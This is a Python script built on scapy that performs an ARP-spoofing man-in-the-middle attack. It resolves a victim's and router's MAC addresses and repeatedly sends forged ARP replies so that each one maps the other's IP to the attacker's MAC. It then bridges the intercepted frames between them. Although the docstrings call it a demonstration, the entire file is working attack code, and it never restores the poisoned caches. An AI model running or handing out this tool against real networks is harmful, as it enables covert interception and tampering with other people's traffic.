import os
import time
import threading
from typing import Optional
from scapy.all import ARP, Ether, conf, get_if_hwaddr, getmacbyip, sendp, sniff

def _resolve_mac(ip: str) -> str:
    """
    Resolve a target IP to a MAC address using ARP. Returns None if unknown.
    """
    return getmacbyip(ip)


def _build_spoof_packet(target_ip: str, target_mac: str, spoof_ip: str, attacker_mac: str) -> ARP:
    """
    Craft an ARP reply telling target_ip that spoof_ip is at attacker_mac.
    """
    return ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)


def _select_iface(target_ip: str, provided_iface: Optional[str] = None) -> str:
    """
    Choose an interface: explicit CLI > SCAPY_IFACE env > routing decision.
    """
    if provided_iface:
        return provided_iface
    env_iface = os.environ.get("SCAPY_IFACE")
    if env_iface:
        return env_iface
    # conf.route.route returns (iface, gw, addr)
    route_iface = conf.route.route(target_ip)[0]
    return route_iface or conf.iface


def _poison_bidirectional(
    victim_ip: str,
    router_ip: str,
    count: int = 3,
    interval: float = 2.0,
    iface: Optional[str] = None,
):
    chosen_iface = _select_iface(victim_ip, iface)
    conf.iface = chosen_iface

    attacker_mac = get_if_hwaddr(chosen_iface)

    mac_victim = _resolve_mac(victim_ip)
    mac_router = _resolve_mac(router_ip)

    if not mac_victim or not mac_router:
        print("[!] Could not resolve MACs for victim and router. Aborting ARP demo.")
        return

    pkt_to_victim = _build_spoof_packet(victim_ip, mac_victim, router_ip, attacker_mac)
    pkt_to_router = _build_spoof_packet(router_ip, mac_router, victim_ip, attacker_mac)
    frame_victim = Ether(src=attacker_mac, dst=mac_victim) / pkt_to_victim
    frame_router = Ether(src=attacker_mac, dst=mac_router) / pkt_to_router

    print(f"[i] Poisoning victim {victim_ip} (MAC {mac_victim}) saying {router_ip} is at {attacker_mac}")
    print(f"[i] Poisoning router {router_ip} (MAC {mac_router}) saying {victim_ip} is at {attacker_mac}")

    def poison_loop(stop_event: threading.Event):
        while not stop_event.is_set():
            sendp(frame_victim, verbose=False, iface=chosen_iface)
            sendp(frame_router, verbose=False, iface=chosen_iface)
            time.sleep(interval)

    stop_event = threading.Event()
    poison_thread = threading.Thread(target=poison_loop, args=(stop_event,), daemon=True)
    poison_thread.start()

    return chosen_iface, attacker_mac, mac_victim, mac_router, stop_event, poison_thread


def _bridge_loop(mac_victim: str, mac_router: str, attacker_mac: str, iface: str, stop_event: threading.Event) -> None:
    """
    Minimal L2 bridge: forward frames between the victim and router that arrive at us.
    """
    print("[i] Forwarding traffic between victim and router (Ctrl+C to stop)...")

    mtu = 1500

    def forward(pkt):
        if not pkt.haslayer(Ether):
            return
        if len(pkt) > mtu:
            return
        eth = pkt[Ether]
        if eth.dst != attacker_mac:
            return
        if eth.src == mac_victim:
            pkt = pkt.copy()
            pkt[Ether].src = attacker_mac
            pkt[Ether].dst = mac_router
            sendp(pkt, iface=iface, verbose=False)
        elif eth.src == mac_router:
            pkt = pkt.copy()
            pkt[Ether].src = attacker_mac
            pkt[Ether].dst = mac_victim
            sendp(pkt, iface=iface, verbose=False)

    sniff(iface=iface, prn=forward, store=False, stop_filter=lambda _: stop_event.is_set())


def run(victim_ip: str, router_ip: str, count: int = 3, interval: float = 2.0, iface: Optional[str] = None) -> None:
    """
    Demonstrate MITM by poisoning the victim and router ARP caches and forwarding traffic.
    """
    poisoned = _poison_bidirectional(victim_ip, router_ip, count=count, interval=interval, iface=iface)
    if not poisoned:
        return
    chosen_iface, attacker_mac, mac_victim, mac_router, stop_event, poison_thread = poisoned
    try:
        _bridge_loop(mac_victim, mac_router, attacker_mac, chosen_iface, stop_event)
    except KeyboardInterrupt:
        print("\n[i] Stopping forwarding loop.")
    finally:
        stop_event.set()
        poison_thread.join(timeout=1.0)
